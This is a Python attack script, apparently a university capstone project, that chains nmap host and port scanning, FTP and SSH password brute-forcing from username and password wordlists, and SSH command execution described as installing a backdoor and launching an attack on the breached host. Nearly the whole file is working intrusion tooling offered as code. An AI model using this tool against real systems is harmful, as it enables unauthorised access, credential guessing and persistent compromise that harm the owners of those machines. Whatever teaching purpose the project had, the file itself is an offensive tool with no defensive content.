# Adedotun Odutola aco0008
# Auburn University Capstone Project
# attack.py

import nmap
import paramiko
import time
from ftplib import FTP


nmScan = nmap.PortScanner()

# Function to scan subnet mask for active hosts in a network
# Input: String Subnet mask (i.e., 192.168.10.1/24)
# Output: list of active hosts. (i.e., [127.0.0.1:up, 192.168.10.1]) 
def hostScan(ip):
    hostList = []
    nmScan.scan(hosts=ip, arguments='-n -sP -PE -PA21,23,80,3389')
    hosts_list = [(x, nmScan[x]['status']['state']) for x in nmScan.all_hosts()]
    for host, status in hosts_list:
        hostList.append('{0}:{1}'.format(host,status))
    return hostList

# Function to scan a specfic IP for potential vulnerability information about a
# machine.
# Input: list of ports to scan ([53,80,8080]) and a string of a specfic ip. (i.e. 192.168.10.1)
# Output: List of open ports
# Future use: Scan for more information including host name, operating system, etc.
def portScan(portsToScan, ip):
    ports = []
    for i in portsToScan:  
    # scan the target port 
        res = nmScan.scan(ip,str(i)) 
   
    # the result is a dictionary specifying  
    # whether the port is opened or closed
        res = res['scan'][ip]['tcp'][i]['state'] 
        # We only care about the ports that are open so filter as such
        if res == "open":
            ports.append(f'{i}:{res}')
    openPorts = []
    for i in ports:
        openPorts.append(i.split(':')[0])
    print(openPorts)
    print(ip)
    return openPorts

# Function to attempt to gain access into a vulnerable machine.
# Input: list of open ports found in machine. String of the machines IP
# Output: boolean value stating whether or not access was gained. If true,
# returns the username and password combination along with the access method.
# Future use: This function can be more flexible to gain access using a variety 
# of more methods other than just FTP and SSH as the API intends. For the sake
# of testing I used only two methods. 
def gainAccess(portsOpen, ip):
    gained_access = False
    host = ip
    username = ""
    password = ""
    ftpPort = '21'
    sshPort = '22'

    # Attempts to gain access using FTP first
    if ftpPort in portsOpen:
        accessMethod = "FTP"
        for i in range(0,1):
            with open("users.txt","r") as f:
                for line in f:
                    username = line.strip()
            
                    with open("pass.txt","r") as g:
                        for passLine in g:
                            password = passLine.strip().split(",")
                    for j in password:
                        try:
                      
                            print("Trying Account Combination: " + username + " and " + j)
                            ftp = FTP(ip)
                            ftp.login(username, j) 
                            gained_access = True
                            print("Gained Access via FTP")
                            return gained_access, username, j, accessMethod       
                        except:
                            print("FTP Attempt Failed. Password Incorrect\n")
                            time.sleep(1)
    
                    g.close()
            f.close()

    # Unable to gain access via FTP so attempts SSH next
    if sshPort in portsOpen:
        accessMethod = "SSH"
        for i in range(0,1):
            with open("users.txt","r") as f:
                for line in f:
                    username = line.strip()
            
                    with open("pass.txt","r") as g:
                        for passLine in g:
                            password = passLine.strip().split(",")
                    for j in password:
                        try:
                            print("Trying Account Combination: " + username + " and " + j)
                            ssh = paramiko.SSHClient()
                            ssh.load_system_host_keys()
                            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                            ssh.connect(host, username=username, password=j)
                            gained_access = True
                            ssh.close()
                            print("SSH Attempt Successful!")
                            return gained_access, username, j, accessMethod
                        except:
                            print("SSH Attempt Failed. Password Incorrect\n")
                            time.sleep(1)
    username = None
    password = None
    return gained_access, username, password
    
# Function reached only after successfully able to gain access to the machine.
# Input: string containing command to use on the compromised machine.
# string username and password combination used to gain access.
# string of the IP of the host that was breached.
# Output: Response string stating whether or not the command was successful.
def addBackdoor(command, username, password, host):
    try:
        ssh = paramiko.SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, username=username, password=password)
        stdin,stdout,stderr=ssh.exec_command(command)
        commandResponse = "Backdoor command: " + command + " was successfully installed"
        ssh.close()
        return commandResponse

    except: 
        commandResponse = "Backdoor was not installed"
        return commandResponse

# Function reached only after gaining access. Goal is to initiate an attack
# on the compromised machine.
# Input: string containing the command to run on the compromised machine.
# string username and password combination used to gain access.
# string of the IP of the host that was breached.
# Output: Response string stating whether or not the command was successful.
def initiateAttack(command,username, password, host):
    try:
        ssh = paramiko.SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, username=username, password=password)
        stdin,stdout,stderr=ssh.exec_command(command)
        commandResponse = "Attack command: " + command + " was successfully initiated"
        print(commandResponse)
        return commandResponse             

    except: 
        commandResponse = "Attack was not initiated"
        return commandResponse 
 